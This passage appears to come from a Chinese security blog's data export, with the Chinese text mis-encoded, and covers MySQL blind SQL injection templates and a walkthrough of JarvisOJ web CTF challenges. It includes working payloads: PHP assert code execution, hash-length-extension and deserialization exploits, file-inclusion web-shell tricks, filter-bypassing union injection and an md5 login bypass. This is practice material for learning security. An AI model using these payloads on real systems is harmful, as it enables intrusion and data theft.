æ³•å›æ˜¾åˆ°å±å¹•ä¸Šï¼Œå°±å¯ä»¥ç”¨æŸäº›å‡½æ•°å¯¹æ•°æ®è¿›è¡Œçˆ†ç ´å¤„ç†ã€‚ æ¯”å¦‚æƒ³è¦å¾—åˆ°æ•°æ®åº“åï¼Œå°±å¯ä»¥ç”¨å‡½æ•°æˆªå–æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç„¶åçˆ†ç ´ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦ç­‰äºæŸä¸ªå­—ç¬¦ï¼Œå°±è®©å…¶æ‰§è¡ŒæŸäº›æ“ä½œï¼ˆæ¯”å¦‚ï¼Œç¡3sï¼‰ï¼Œä¸æ–­è¿›è¡Œä¸‹ä¸€ä¸ªå­—ç¬¦çš„çˆ†ç ´ï¼Œæ‹¼æ¥èµ·æ¥å°±æ˜¯æ•°æ® å…ˆä»‹ç»å‡ ä¸ªå‡½æ•° ifå‡½æ•° æ ¼å¼ï¼šIF(Condition,A,B) å«ä¹‰ï¼šå¦‚æœConditionæˆç«‹ï¼Œåˆ™Aï¼Œå¦åˆ™B substrå‡½æ•° æ ¼å¼ï¼šSUBSTR(string,start,len) å«ä¹‰ï¼šä»stringçš„startä½å¼€å§‹æˆªå–lenä¸ªå­—ç¬¦ midå‡½æ•° æ ¼å¼ï¼šMID(column_name,start[,length]) å«ä¹‰ï¼šä»column_nameä¸­startä½å¼€å§‹æˆªå–length(å¯é€‰å‚æ•°)é•¿åº¦ asciiå‡½æ•° æ ¼å¼ï¼šASCII(char) å«ä¹‰ï¼šå°†charè½¬åŒ–æˆasciiç  leftå‡½æ•° æ ¼å¼ï¼šLEFT ( string, n ) å«ä¹‰ï¼šå‡½æ•°å¾—åˆ°å­—ç¬¦ä¸²å·¦éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ï¼Œstringä¸ºè¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œnä¸ºé•¿åº¦ã€‚ rightå‡½æ•° æ ¼å¼ï¼šRIGHT( string, n ) å«ä¹‰ï¼šå‡½æ•°å¾—åˆ°å­—ç¬¦ä¸²å³éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ï¼Œstringä¸ºè¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œnä¸ºé•¿åº¦ã€‚ lengthå‡½æ•° æ ¼å¼ï¼šLENGTH(string) å«ä¹‰ï¼šå¾—åˆ°stringçš„é•¿åº¦ åŸºäºæ—¶é—´çš„ç›²æ³¨åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼ˆå»¶æ—¶æ³¨å…¥ï¼‰æ˜¯ä¸»è¦é’ˆå¯¹é¡µé¢æ— å˜åŒ–ã€æ— æ³•ç”¨å¸ƒå°”çœŸå‡åˆ¤æ–­ã€æ— æ³•æŠ¥é”™çš„æƒ…å†µä¸‹çš„æ³¨å…¥æŠ€æœ¯ è¿™é‡ŒåŸºäºæ—¶é—´çš„ç›²æ³¨ä¸»è¦ç”¨çš„å°±æ˜¯sleep()å‡½æ•°ï¼Œæ ¹æ®ååº”æ—¶é—´æ¥ç¡®å®šæ˜¯å¦æ­£ç¡® ä¸€èˆ¬ç”¨ä¸‹é¢çš„æ¨¡æ¿å°±å¯ä»¥è§£å†³ 123456try: payload&#x3D; &#39;*** and if(ascii(substr(***,1,1))&#x3D;*,sleep(3),0)%23&#39; r&#x3D;requests.get(url+payload,timeout&#x3D;3) &#x2F;&#x2F;æ³¨æ„è¦è®¾ç½®è®¾ç½®timeoutexcept requests.exceptions.ReadTimeout as e: &#x2F;&#x2F;è¶…æ—¶å¼‚å¸¸ data+&#x3D;chr(j) break å¸ƒå°”å‹ç›²æ³¨å¸ƒå°”å‹ç›²æ³¨å’ŒåŸºäºæ—¶é—´çš„ç›²æ³¨æœ€å¤§çš„åŒºåˆ«å°±æ˜¯å¸ƒå°”å‹ç›²æ³¨æ˜¯æ ¹æ®é¡µé¢å›æ˜¾å†…å®¹ä¸åŒæ¥åˆ¤æ–­çš„ï¼Œè€Œæ—¶é—´ç›²æ³¨ä¸éœ€è¦åœ¨æ„è¿™ä¸€ç‚¹ï¼Œåªéœ€åˆ¤æ–­å“åº”æ—¶é—´å°±è¡Œ ä¸€èˆ¬ç”¨ä¸‹é¢çš„æ¨¡æ¿å°±å¯ä»¥è§£å†³ 1234567try: payload&#x3D; &#39;*** and ascii(substr(***,1,1))&#x3D;*%23&#39; r&#x3D;requests.get(url+payload) if &quot;***&quot; in r.text: data+char(j)except Exceptions as e: break æŠ¥é”™æ³¨å…¥è¿™ä¸ªå¥½åƒæœ‰ç‚¹å¤šï¼Œå•ç‹¬å†™ä¸€ç¯‡åšå®¢æ€»ç»“ä¸€ä¸‹ï¼šhttps://www.moonback.xyz/2019/10/25/mysql-wrong-injection/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://www.m00nback.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"jarvisoj webéƒ¨åˆ†writeup","slug":"jarvisoj-web-wp","date":"2019-10-05T13:52:51.000Z","updated":"2020-04-23T09:15:50.363Z","comments":true,"path":"2019/10/05/jarvisoj-web-wp/","link":"","permalink":"http://www.m00nback.xyz/2019/10/05/jarvisoj-web-wp/","excerpt":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†jarvisOJä¸Šwebéƒ¨åˆ†é¢˜writeupï¼ï¼ï¼","text":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†jarvisOJä¸Šwebéƒ¨åˆ†é¢˜writeupï¼ï¼ï¼ [61dctf]babyphpæ‰“å¼€é¢˜ç›®å‘ç°æç¤ºgitæ­å»ºçš„ï¼Œæœ‰æ²¡æœ‰æºç æ³„éœ²ï¼Ÿ githackè·‘ä¸‹ï¼Œå¾—åˆ°æºç  12345678910&lt;?phpif (isset($_GET[&#x27;page&#x27;])) &#123; $page = $_GET[&#x27;page&#x27;];&#125; else &#123; $page = &quot;home&quot;;&#125;$file = &quot;templates/&quot; . $page . &quot;.php&quot;;assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);assert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);?&gt; ä»æ³„éœ²é‡Œå¯ä»¥çœ‹åˆ°æœ‰flag.phpï¼ŒçŒœæµ‹flagåœ¨é‡Œé¢ ä»æºç é‡Œå¯ä»¥çœ‹åˆ°å¯ä»¥ä»£ç æ‰§è¡Œ payload: ?page=&#39;^system(&#39;cat templates/flag.php&#39;)^&#39; å¾—åˆ°flag [61dctf]adminæ‰“å¼€é¢˜ç›®ç½‘å€ï¼š dirsearchä¸€æ‰« è®¿é—®robots.txt è®¿é—®æç¤ºçš„å†…å®¹ flagå‡ºæ¥äº†ï¼Ÿé‚£ä¹ˆç®€å•ï¼Ÿå°±æ˜¯é‚£ä¹ˆç®€å• LOCALHOSTæ‰“å¼€é¢˜ç›®ç½‘å€ï¼š ä»…æœ¬æœºè®¿é—®ï¼Œç«‹åˆ»æƒ³åˆ°æŠ“åŒ…æ”¹XFF flagå°±è¿™æ ·å‡ºæ¥äº†ï¼Œæ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Ÿå°±æ˜¯è¿™æ ·ç®€å• PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125; flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œæ‰“å¼€æç¤ºOnly Admin can see the flag!! æŠ“åŒ…çœ‹ä¸‹ï¼Œå¾ˆæ˜æ˜¾é—®é¢˜çš„å…¥æ‰‹ç‚¹åœ¨Cookieè¿™é‡Œ urlè§£ç å‘ç°æ˜¯ æ”¹ä¸‹guesté‡æ–°å‘åŒ…å‘ç°æ²¡ååº”ï¼Œåº”è¯¥å’Œhshæœ‰å…³ç³» æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå°±æ‰«ä¸‹è·¯å¾„å§ï¼Œdirsearchæ‰«åˆ°å¤‡ä»½æ–‡ä»¶index.php~ï¼Œä½†æ‰“å¼€å‘ç°ä¸èƒ½çœ‹åˆ°æºç  çŒœæµ‹æ˜¯viå¼‚å¸¸é€€å‡ºçš„æ–‡ä»¶ï¼Œç¬¬ä¸€æ¬¡å¼‚å¸¸é€€å‡ºä¼šäº§ç”Ÿä¸€ä¸ª*.swpï¼Œå†æ¬¡æ„å¤–é€€å‡ºåï¼Œå°†ä¼šäº§ç”Ÿåä¸º*.swoçš„äº¤æ¢æ–‡ä»¶ï¼›è€Œç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º*.swnçš„æ–‡ä»¶ï¼Œä¾æ­¤ç±»æ¨ã€‚ å¯ä»¥ç›´æ¥ç”¨vim -ræ¢å¤æ–‡ä»¶ æ¢å¤å‡ºæ¥çš„å…³é”®ä»£ç  123456789101112131415161718192021222324&lt;?php $auth = false;$role = &quot;guest&quot;;$salt = if (isset($_COOKIE[&quot;role&quot;])) &#123; $role = unserialize($_COOKIE[&quot;role&quot;]); $hsh = $_COOKIE[&quot;hsh&quot;]; if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125;&#125; else &#123; $s = serialize($role); setcookie(&#x27;role&#x27;,$s); $hsh = md5($salt.strrev($s)); setcookie(&#x27;hsh&#x27;,$hsh);&#125;if ($auth) &#123; echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;&#125;?&gt; è¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯ååºåˆ—åŒ–Cookieé‡Œçš„roleï¼Œå°†salt(æœªçŸ¥)å’Œåè½¬åçš„roleæ‹¼æ¥ä¸€èµ·å¹¶MD5åŠ å¯†ï¼Œç„¶åä¸Cookieé‡Œçš„hashæ¯”è¾ƒï¼Œç›¸ç­‰å°±ä¼šè¾“å‡ºflag è¿™å°±è¦ç”¨åˆ°hashæ‰©å±•æ”»å‡»çš„çŸ¥è¯†å‚è§æˆ‘çš„å¦å¤–ä¸€ç¯‡åšå®¢ï¼šhttps://www.moonback.xyz/2019/12/16/hash-extend-attack/ ç”±äºæˆ‘ä»¬ä¸çŸ¥é“$saltçš„é•¿åº¦ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹å…¶é•¿åº¦çˆ†ç ´ï¼Œçˆ†ç ´ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“çš„æ˜¯ååºåˆ—åŒ–å‡½æ•°å­˜åœ¨00æˆªæ–­ï¼Œä¸ºä¿è¯$role===&quot;admin&quot;ï¼Œæˆ‘ä»¬å¿…é¡»s:5:&quot;guest&quot;;åœ¨å‰é¢ï¼Œæ³¨æ„æœåŠ¡ç«¯åœ¨md5åŠ å¯†çš„æ˜¯åè½¬çš„roleçš„é”®å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬æ„é€ çš„payloadåº”è¯¥ä¸ºä»¥ä¸‹å†…å®¹ï¼Œæœ€ç»ˆçŸ¥é“saltçš„é•¿åº¦ä¸º12(0c) è¿™é‡Œæœ‰ä¸ªè„šæœ¬ï¼Œéœ€è¦è£…ä¸ªhashpumpyåº“ 123456789101112131415161718import hashpumpyimport urllibimport requestsurl=&#x27;http://web.jarvisoj.com:32778/&#x27;hsh=&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;s1=&#x27;&#x27;&#x27;s:5:&quot;guest&quot;;&#x27;&#x27;&#x27;s2=&#x27;&#x27;&#x27;s:5:&quot;admin&quot;;&#x27;&#x27;&#x27;for i in range(1,30): m=hashpumpy.hashpump(hsh,s1[::-1],s2[::-1],i) # å››ä¸ªå‚æ•°åˆ†åˆ«ä¸º hashå€¼ secretåçš„å­—ç¬¦ä¸² æ›´æ”¹åsecretåçš„å­—ç¬¦ä¸² secretçš„é•¿åº¦ print i Cookie=&quot;role=&quot;+urllib.quote(urllib.unquote(m[1])[::-1])+&quot;; hsh=&quot;+m[0] headers=&#123;&quot;Cookie&quot;:Cookie&#125; r=requests.get(url,headers=headers) if &quot;Welcome&quot; in r.text: print r.text; break PHPINFOæ‹¿åˆ°é¢˜æ˜¯è¿™æ ·çš„ 1234567891011121314151617181920212223242526&lt;?php&#x2F;&#x2F;A webshell is wait for youini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz &#x3D; &#39;phpinfo();&#39;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET[&#39;phpinfo&#39;]))&#123; $m &#x3D; new OowoO();&#125;else&#123; highlight_string(file_get_contents(&#39;index.php&#39;));&#125;?&gt; æ—¢ç„¶é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬phpinfo,æˆ‘ä»¬å°±å°è¯•è®¿é—®ä¸€ä¸‹,å‘ç°æœç„¶å­˜åœ¨ ä»phpinfoèƒ½çœ‹å‡ºæ¥å¥½å¤šä¸œè¥¿ï¼Œè¿™é‡Œå°±ä¸ç»•å¼¯å­äº† æœ¬é¢˜è€ƒå¯Ÿçš„å°±æ˜¯sessionååºåˆ—åŒ–çš„çŸ¥è¯† session.save_pathæ˜¯æŒ‡sessionçš„å­˜å‚¨è·¯å¾„ï¼Œå¦‚æœæ˜¯no valueï¼Œé‚£ä¹ˆå°†ä¼šæ˜¯é»˜è®¤è·¯å¾„/tmp/sess_** session.serialize_handleræ˜¯æŒ‡sessionçš„åºåˆ—åŒ–å¼•æ“ã€‚Master Valueæ˜¯PHP.iniæ–‡ä»¶ä¸­çš„å†…å®¹ï¼ŒLocal value æ˜¯å½“å‰ç›®å½•ä¸­çš„è®¾ç½®ï¼Œè¿™ä¸ªå€¼ä¼šè¦†ç›–Master Valueä¸­å¯¹åº”çš„å€¼ session.upload_progress.cleanupè¿™ä¸ªæ˜¯æŒ‡sessionä¸Šä¼ è¿›åº¦æ˜¯å¦è‡ªåŠ¨æ¸…é™¤çš„é€‰é¡¹ å¯ä»¥çœ‹ä¸‹æ‰‹å†Œ å¤§æ¦‚æ„æ€å°±æ˜¯ï¼Œå¦‚æœsessionä¸Šä¼ è¿›åº¦å¼€å¯çš„è¯ï¼Œå¯ä»¥POSTä¸€ä¸ªPHP_SESSION_UPLOAD_PROGRESSå˜é‡ï¼Œä¸Šä¼ è¿›åº¦ä¼šä¿å­˜åœ¨$_SESSIONä¸­ï¼Œç„¶åé€šè¿‡phpåºåˆ—åŒ–å¼•æ“çš„ä¸åŒæ¥å¯¼è‡´æ¼æ´ï¼ˆsessionçš„å†™å…¥ä¼šåºåˆ—åŒ–ï¼Œsessionçš„è¯»å–ä¼šååºåˆ—åŒ–ï¼‰ 1234567891011121314151617&lt;?phpclass OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz &#x3D; &#39;æ¶æ„ä»£ç &#39;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;$a&#x3D;new OowoO();echo serialize($a);?&gt; åºåˆ—åŒ–çš„ç»“æœ O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:16:&quot;æ¶æ„ä»£ç &quot;;&#125; //é•¿åº¦ä¿®æ”¹ä¸‹ è¿™é‡Œæˆ‘ä»¬ç”¨ä¸‹é¢è¿™ä¸ªç½‘é¡µæ„é€  12345&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt; æŠ“åŒ…å¯ä»¥çœ‹åˆ° ä»phpinfoå¯ä»¥çœ‹åˆ°ç½‘ç«™è·¯å¾„æ˜¯/opt/lampp/htdocsï¼Œç„¶ååœ¨filenameæ’å…¥ååºåˆ—åŒ–çš„å†…å®¹ |O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:36:\\&quot;print_r(scandir(dirname(__FILE__)));\\&quot;;&#125; |O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:88:\\&quot;print_r(file_get_contents(\\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\&quot;));\\&quot;;&#125; apiè°ƒç”¨è¿™é¢˜å°±æ˜¯ä¸€ä¸ªç®€å•çš„xxe æŠ“åŒ…å°†Content-Typeæ”¹æˆapplication/xmlï¼ŒPOSTåŒºæ·»åŠ è€Œå·²xmlå°±è¡Œ Easy Galleryæ‰“å¼€é¢˜ç›®ï¼Œå‘ç°æœ‰ä¸‰ä¸ªé¡µé¢ åˆ‡æ¢ä¸€ä¸‹å‘ç°æœ‰pageè¿™ä¸ªå‚æ•°ï¼Œç¬é—´æƒ³åˆ°äº†æ–‡ä»¶åŒ…å« è¯•è¯•index.php å‘ç°æ˜¯fopenå‡½æ•°ï¼Œæƒ³åˆ°äº†%00æˆªæ–­ï¼Œè¯•è¯•å§ æ„é€ ç±»ä¼¼çš„payloadï¼š index.php?page=uploads/1576482315.gif%00 ä¸Šä¼ ä¸€ä¸ªgif/jpgå›¾ç‰‡é©¬ï¼Œå‘ç° å¯¹&lt;?phpæˆ–?&gt;åšäº†è¿‡æ»¤? è¯•è¯•&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;å§ å¾—åˆ°flagï¼Œæ„Ÿè§‰ViewåŠŸèƒ½éƒ½æ²¡ç”¨ä¸Š2333â€¦.. IN A Messæ‰“å¼€é¢˜ç›®ç½‘å€ï¼š çœ‹åˆ°id=1ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°æ³¨å…¥ï¼Œå¾ˆå¯æƒœä¸æ˜¯æ³¨å…¥ æŸ¥çœ‹æºä»£ç çœ‹åˆ°æœ‰ä¸ªæç¤ºï¼Œè®¿é—®ä¸€ä¸‹ å¾—åˆ°ä¸€å¤§ä¸²ä»£ç ï¼Œæ’ç‰ˆä¸€ä¸‹ ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œid,a,b idå€¼ç­‰äº0ä½†è‡ªèº«ä¸èƒ½ä¸º0,å¯ä»¥å¼±ç±»å‹æ¯”è¾ƒ aæ¶‰åŠfile_get_contentsï¼Œéœ€ç”¨ä¼ªåè®®php://inputä¼ å…¥â€1112 is a nice lab!â€ bé•¿åº¦å¤§äº5ä¸”å¯èƒ½æ¶‰åŠeregiç»•è¿‡ï¼Œå¯ä»¥ç”¨%00æˆªæ–­ payload1:?id=0.&amp;a=php://input&amp;b=%000x34aa å¹¶postä¸ª1112 is a nice lab! payload2:?id=0e&amp;a=data:,1112 is a nice lab!&amp;b=%00411111 å…³äºpayload2ä¸­data:åä¸ºä»€ä¹ˆæœ‰é€—å·ï¼Œå…·ä½“å‚è§ï¼šhttps://blog.csdn.net/qq1045553189/article/details/87479691 æœ¬ä»¥ä¸ºå¾—åˆ°äº†flag,æäº¤å‘ç°é”™è¯¯ï¼Œå†çœ‹çœ‹500å¤§åˆ†çš„é¢˜ï¼Œåº”è¯¥ä¸ä¼šé‚£ä¹ˆç®€å•ï¼Œå†æˆ˜ ä¹Ÿä¸ç»•å¼¯å­äº†ï¼Œç›´æ¥è®¿é—®æˆ‘ä»¬æˆ‘ä»¬å¾—åˆ°çš„ä¿¡æ¯ï¼Œæœç„¶æœ‰è¿™ä¸ªç½‘é¡µï¼Œä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆ&gt;_&lt; åˆçœ‹åˆ°id=1äº†ï¼Œå†æ¬¡æƒ³åˆ°æ³¨å…¥ï¼Œè¿™æ¬¡å¯¹äº†ï¼ŒåŠ ä¸ª/,å‘ç° å°è¯•id=2-1,å‘ç°è¿”å›è¿˜æ˜¯id=1çš„ç»“æœï¼Œè¯´æ˜ä»£å…¥æ‰§è¡Œäº†ï¼Œå­˜åœ¨æ³¨å…¥å›æ˜¾ä¸ºå¦‚æœæ£€æµ‹åˆ°æ³¨å…¥å°±è¿”å›you bad boy/girl!ï¼Œå¦‚æœæ‰§è¡Œäº†æŸ¥è¯¢ä¸åˆ°ç»“æœå°±è¿”å›æ‰§è¡Œè¯­å¥ order by åˆ¤æ–­åˆ—æ•°ï¼Œå‘ç°è¢«è¿‡æ»¤äº†ï¼Œ å°†ç©ºæ ¼æ›¿æ¢æˆ/**/å‘ç°ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå°†ç©ºæ ¼æ›¿æ¢ä¸º/1/ï¼Œè¿”å›hi666 å½“ä¸º4æ—¶æŠ¥é”™ï¼Œåªæœ‰ä¸‰åˆ—ï¼Œè”åˆæŸ¥è¯¢åˆ¤æ–­å›æ˜¾ä½ï¼Œå‘ç°å‘ç°union,select,froméƒ½è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼ŒåŒå†™å³å¯ç»•è¿‡ ?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,database(),3%23 æ‰§è¡Œå‘ç°å›æ˜¾3ï¼Œè¯´æ˜ç¬¬ä¸‰ä¸ªä½ç½®ä¸ºå›æ˜¾ä½ ?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,database()%23 çˆ†å‡ºæ•°æ®åº“test ? id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frfromom/*1*/information_schema.tables/*1*/where/*1*/table_schema=database()%23 çˆ†å‡ºè¡¨ä¸ºcontent ?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_schema=database()# çˆ†å‡ºå­—æ®µid,context,title ?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(id,0x23,context,0x23,title)/*1*/frfromom/*1*/test.content# PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125; ç¥ç›¾å±€çš„ç§˜å¯†æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒCtrl+UæŸ¥çœ‹æºç å‘ç° çŒœæµ‹imgä¼ çš„ä¸œè¥¿æ˜¯base64åŠ å¯†çš„ï¼Œè§£å¯†ä»¥ä¸‹å‘ç°æ˜¯shield.jpgï¼Œæ¢æˆå…¶ä»–/etc/passwdå‘ç°ä¸è¡Œï¼Œå°è¯•åŒ…å«index.php,showimg.php,shield.php index.php: 123456789&lt;?php require_once(&#x27;shield.php&#x27;); $x = new Shield(); isset($_GET[&#x27;class&#x27;]) &amp;&amp; $g = $_GET[&#x27;class&#x27;]; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; showing.php: 123456789101112&lt;?php $f = $_GET[&#x27;img&#x27;]; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,&#x27;..&#x27;)===FALSE &amp;&amp; stripos($f,&#x27;/&#x27;)===FALSE &amp;&amp; stripos($f,&#x27;\\\\&#x27;)===FALSE &amp;&amp; stripos($f,&#x27;pctf&#x27;)===FALSE) &#123; readfile($f); &#125; else &#123; echo &quot;File not found!&quot;; &#125; &#125;?&gt; shield.php: 12345678910111213141516&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = &#x27;&#x27;) &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#x27;..&#x27;)===FALSE &amp;&amp; stripos($this-&gt;file,&#x27;/&#x27;)===FALSE &amp;&amp; stripos($this-&gt;file,&#x27;\\\\&#x27;)==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; å¯ä»¥çŸ¥é“flagåœ¨pctf.phpä¸­ï¼Œä½†è¿‡æ»¤äº†pctfï¼Œä¸èƒ½ç›´æ¥åŒ…å«pctf.php æ„é€ ååºåˆ—åŒ–åºåˆ—ï¼š payload: index.php?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125; æŸ¥çœ‹æºç å¾—åˆ°flag Loginæ‰“å¼€é¢˜ç›®ç½‘å€ï¼š å¥½åƒæ²¡ä»€ä¹ˆæ€è·¯å•Šï¼ŒæŠ“åŒ…çœ‹çœ‹å§ çœ‹åˆ°å“åº”å¤´ä¸­æœ‰ä¸ªæç¤º &quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot; md5()å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•° å‚æ•°ä¸€æ˜¯è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼› å‚æ•°äºŒæ˜¯è¾“å‡ºæ ¼å¼ï¼šä¸ºtrueæ—¶ï¼Œè¡¨ç¤ºè¾“å‡ºåŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼›é»˜è®¤ä¸ºfalseï¼Œè¡¨ç¤ºè¾“å‡º32å­—ç¬¦åå…­è¿›åˆ¶æ•°ã€‚ çœ‹åˆ°æç¤ºç¬¬ä¸€æ—¶é—´æƒ³åˆ°æ³¨å…¥,å¯æ˜¯å¦‚ä½•é—­åˆsqlè¯­å¥å‘¢ï¼Ÿå¦‚æœæ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²MD5åŠ å¯†åå¾—åˆ°çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼åœ¨SQLä¸­æ‹¼æ¥æˆ ç±»ä¼¼ â€˜orâ€™xxxçš„å½¢å¼å°±å¯ä»¥ç»•è¿‡äº† å°†ffifdyopæäº¤flagå°±å‡ºæ¥äº† PCTF&#123;R4w_md5_is_d4ng3rous&#125; LOCALHOSTæ‰“å¼€é¢˜ç›®ç½‘å€ï¼š ä»…æœ¬æœºè®¿é—®ï¼Œç«‹åˆ»æƒ³åˆ°æŠ“åŒ…æ”¹XFF flagå°±è¿™æ ·å‡ºæ¥äº†ï¼Œæ˜¯ä¸æ˜¯å¾ˆç®€å•ï¼Ÿå°±æ˜¯è¿™æ ·ç®€å• PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125; PORT51æ‰“å¼€é¢˜ç›®ç½‘å€å¯ä»¥å‘ç°ï¼š å®ƒè®©æˆ‘ä»¬ç”¨51ç«¯å£è®¿é—®è¿™ä¸ªç½‘å€ çœ‹å…¶ä»–å¤§ä½¬çš„wpç”¨çš„æ˜¯curlå‘½ä»¤ï¼Œæ‰“å¼€è™šæ‹Ÿæœºå’±ä¹Ÿè¯•ä¸‹å§ curl â€“local-port http://web.jarvisoj.com:32770/ ç¥é­”æƒ…å†µï¼Ÿåˆçœ‹äº†çœ‹å‡ ä½å¤§ä½¬çš„åšå®¢ï¼Œè¯´æ˜¯å¿…é¡»è¦ç”¨å…¬ç½‘IPçš„ä¸»æœºæ‰è¡Œã€‚ä¸å¤ªæ­»å¿ƒï¼Œåˆè¯•äº†è¯•cmdé‡Œçš„ï¼Œæœç„¶è¿˜æ˜¯ä¸è¡Œã€‚ æŸ¥çœ‹äº†ä¼—å¤šå¤§ä½¬çš„åšå®¢åå¾—å‡ºçš„åŸå› å¥½åƒæ˜¯ï¼šæœ¬åœ°ç§æœ‰åœ°å€ä»ä»£ç†æœåŠ¡å™¨å‡ºå»åï¼Œä½¿ç”¨çš„æ˜¯ä»£ç†æœåŠ¡å™¨çš„ç«¯å£ï¼Œè¿™ä¸ªç«¯å£å¾€å¾€ä¸ä¼šæ˜¯51ï¼Œæˆ‘ç”¨çš„æ˜¯æ ¡å›­ç½‘ï¼Œè™šæ‹Ÿæœºä¹Ÿæ˜¯ç»è¿‡ä¸»æœºèµ°çš„æ ¡å›­ç½‘ï¼Œæ‰€ä»¥ã€‚ã€‚ã€‚ã€‚ æ²¡åŠæ³•åªèƒ½æŠ„åˆ«äººçš„flagäº† PCTF&#123;M45t3r_oF_CuRl&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"jarvisoj","slug":"jarvisoj","permalink":"http://www.m00nback.xyz/tags/jarvisoj/"}]},{"title":"bugku webéƒ¨åˆ†é¢˜ç›®writeup","slug":"bugku-web-partquestion","date":"2019-10-01T10:09:15.000Z","updated":"2019-10-17T05:53:28.980Z","comments":true,"path":"2019/10/01/bugku-web-partquestion/","link":"","permalink":"http://www.m00nback.xyz/2019/10/01/bugku-web-partquestion/","excerpt":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†bugkuä¸­webéƒ¨åˆ†é¢˜çš„writeup,æ„Ÿè§‰è¿™äº›é¢˜è‡ªå·±æ”¶è·è¿˜æŒºå¤šçš„ï¼ŒåŒ…æ‹¬ä»¥ä¸‹é¢˜ç›®ï¼š cookiesæ¬ºéª— welcome to 